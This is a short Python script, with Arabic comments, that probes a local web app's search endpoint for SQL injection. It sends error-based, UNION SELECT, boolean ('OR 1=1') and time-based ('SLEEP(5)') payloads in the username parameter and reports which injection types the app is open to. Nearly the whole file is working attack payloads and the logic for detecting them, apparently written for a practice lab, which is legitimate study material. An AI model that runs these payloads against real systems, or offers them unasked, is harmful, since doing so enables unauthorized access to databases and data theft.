import requests

URL = "http://127.0.0.1:5000/search"

def identify_injection():
    print("🧪 تحديد نوع الحقن...\n")
    
    # 1. اختبار Error-Based
    r = requests.get(URL, params={"username": "'"})
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print("✅ النوع: Error-Based (يظهر رسائل خطأ)")
    
    # 2. اختبار Union-Based
    payload = "' UNION SELECT 1, 2, 3, 4 -- "
    r = requests.get(URL, params={"username": payload})
    if "2" in r.text and "3" in r.text:
        print("✅ النوع: Union-Based (يمكن دمج استعلامات)")
    
    # 3. اختبار Boolean-Based
    r_true = requests.get(URL, params={"username": "' OR '1'='1"})
    r_false = requests.get(URL, params={"username": "' AND '1'='2"})
    if len(r_true.text) != len(r_false.text):
        print("✅ النوع: Boolean-Based (يختلف الرد حسب صح/خطأ)")
    
    # 4. اختبار Time-Based
    import time
    payload = "' AND SLEEP(5) -- "
    start = time.time()
    requests.get(URL, params={"username": payload})
    elapsed = time.time() - start
    if elapsed >= 5:
        print(f"✅ النوع: Time-Based (تأخر الرد {elapsed:.2f} ثانية)")

if __name__ == "__main__":
    identify_injection()